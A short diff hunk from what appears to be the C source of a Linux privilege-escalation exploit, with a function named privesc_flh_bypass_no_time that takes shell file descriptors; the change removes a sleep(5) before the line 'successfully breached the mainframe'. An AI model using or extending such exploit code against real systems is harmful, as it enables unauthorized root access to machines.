@@ -479,7 +479,7 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 					status_cnt = read(status_fd, &buf, 1);
 					if (status_cnt == 0)
 						continue;
-					sleep(5);
+
 					printf("[+] successfully breached the mainframe as real-PID %u\n", pid_guess);
 
 					return;
